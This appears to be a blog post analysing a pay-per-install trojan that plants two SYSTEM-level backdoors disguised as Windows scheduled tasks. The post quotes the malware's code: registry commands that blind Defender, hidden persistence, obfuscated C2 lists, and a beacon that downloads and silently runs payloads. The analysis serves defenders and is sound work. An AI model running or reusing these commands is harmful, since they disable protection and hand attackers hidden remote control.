---
layout: layouts/post.njk
date: 2026-03-25
title: "Run With Affinity"
category: Malware
tags: [REAL]
description: "Two independent SYSTEM-level backdoors dropped by a PPI trojan, hiding behind legitimate Windows task names and hex-encoded C2s."
---

## Overview

`Run With Affinity.rar` is a PPI trojan distributed through a fake CS2 FPS optimization site. It silently installs Opera GX via the browser's CPA affiliate program to generate fraudulent commissions, drops WinRAR for data staging, and harvests credentials from Chrome and Opera GX profiles. The outer dropper is a UPX-packed AutoIT executable, unpacked with `upx -d`.

---

## Defender

Before either agent lands, `t.ps1` applies Group Policy to neuter Defender, then **restarts the Defender services** to force the new policy in:

```powershell
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2
gpupdate /target:computer /force

foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
    Get-Service -Name $svc | Restart-Service -Force
}
Get-Process -Name 'SecurityHealthSystray' | Stop-Process -Force
```

Defender is still running. The shield icon is still in the tray. `C:\` is just fully excluded and cloud reporting is off. Nothing looks wrong to the user.

The script also checks for an existing installation before doing any of this. It validates the scheduled task and all referenced file paths before proceeding:

```powershell
function Check-A-Install {
    $task = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Maps\" `
                              -TaskName "Maps Performance Task" -ErrorAction SilentlyContinue
    # walks task actions and checks every referenced path still exists on disk
    if ($nodeExists -and $taskExists -and $pathExecute -and $pathArguments) { return $true }
    return $false
}

if (-Not (Check-A-Install)) { <# install #> }
```

Runs twice, does nothing the second time.

The `aa.js` download URL is base64-encoded inline rather than stored as a plain string:

```powershell
$url = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String("aHR0cHM6Ly9bUkVEQUNURURdL2FhLmpz")
)
```

---

## Persistence

Both agents are registered as scheduled tasks under paths that read as Windows system infrastructure:

```
\Microsoft\Windows\Maps\Maps Performance Task
\Microsoft\Windows\Servicing\OOBETaskScheduler
```

Both run as `SYSTEM`, trigger at startup, and repeat every hour.

The Node.js install is hidden from Add/Remove Programs:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GUID}" /v SystemComponent /t REG_DWORD /d 1 /f
```

Payload files have no extension, sit inside hidden directories named with random GUIDs:

```
C:\Maps\{guid}\{guid}
C:\{guid}\{5digits}\{4digits}\{guid}.py
```

```powershell
(Get-Item $folderPath).Attributes = $folderPath.Attributes -bor [IO.FileAttributes]::Hidden
```

---

## aa.js

The C2 list is stored entirely as hex strings. No domain appears in plaintext anywhere in the file:

```js
[REMOTE_SERVERS]: () => [
    Buffer.from("hex_1", "hex").toString("utf-8"),
    Buffer.from("hex_2", "hex").toString("utf-8"),
    Buffer.from("hex_3", "hex").toString("utf-8")
]
```

On each run the list is shuffled before attempting connections, so there's no fixed primary server.

Requests go out with a `User-Agent` set to a legitimate API client:

```js
headers: { "user-agent": "insomnia/2023.4.0 Windows" }
```

Machine fingerprinting uses two separate hardware identifiers: the registry `MachineGuid` hashed with SHA256, and the BIOS UUID pulled via WMI:

```js
// MachineGuid - hashed before sending
machineIdSync(true)

// BIOS UUID
execSync('powershell.exe -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"')
    .toString().trim()
    .match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi)[0]
```

Reinstalling Windows rotates `MachineGuid` but not the BIOS UUID. The operator can correlate a wiped machine back to its previous session.

The beacon hits `{C2}/d` and receives a typed command list back. Each entry is a `type:URL` pair:

```js
switch (type) {
    case "node": run(`"${node}" "${file}"`);                           break;
    case "cmd":  run(`"${file}"`);                                     break;
    case "ps1":  run(`powershell.exe -ExecutionPolicy Bypass "${file}"`); break;
    case "ow":   run(`copy "${file}" "${__filename}"`);                break;
    case "sh":   run(`chmod +x "${file}" && "${file}"`);               break;
}
```

`ow` copies a downloaded file over the agent's own script path. The task registration stays untouched; only the payload changes. Every downloaded file is deleted after execution:

```js
cleanupFiles(files) {
    files.forEach(f => fs.unlinkSync(f))
}
```

Privilege is checked via SID rather than any obvious API:

```js
exec('whoami.exe /groups | find "S-1-16-12288"', { windowsHide: true }, (err, stdout) => {
    resolve(!!stdout.trim())
})
// S-1-16-12288 = High Mandatory Level
```

The result is substituted into commands server-side as `%RUNLEVEL%`, so the operator's payload can branch on privilege without the agent knowing what it's running.

---

## 33244556546.py

The C2 domain is a typosquat of a well-known security vendor, picked to blend into network logs and SIEM alerts as expected traffic.

SSL verification is disabled globally at import time:

```python
ssl._create_default_https_context = ssl._create_unverified_context
```

The response format double-encodes the command list: commands are inside a JSON string inside the response JSON:

```python
def parse_scripts(response_body: str):
    outer    = json.loads(response_body)
    metadata = json.loads(outer["metadata"])   # string → JSON
    return metadata.get("script", [])
```

A proxy or log parser inspecting response bodies sees JSON, not executable content.

Commands execute with every available window flag set:

```python
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags    |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

subprocess.run(cmd, shell=True,
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
    startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
```

Errors report back with a full Python traceback and function-level context:

```python
payload = {
    "machine_id":    machine_id,
    "function":      function_name,
    "error":         f"{type(exc).__name__}: {exc}",
    "traceback":     traceback.format_exc(),
}
_post_json(error_endpoint, payload)
```

The operator gets structured crash reports on every failure, scoped to which function broke and why.

---

## Summary

Two agents, two C2 channels, both running as SYSTEM on an hourly loop. One self-updates without touching persistence. The other hides behind a security vendor's name in traffic. Defender is policy-disabled and actively restarting itself into that state on every boot. If one agent is found and killed, the other is untouched.
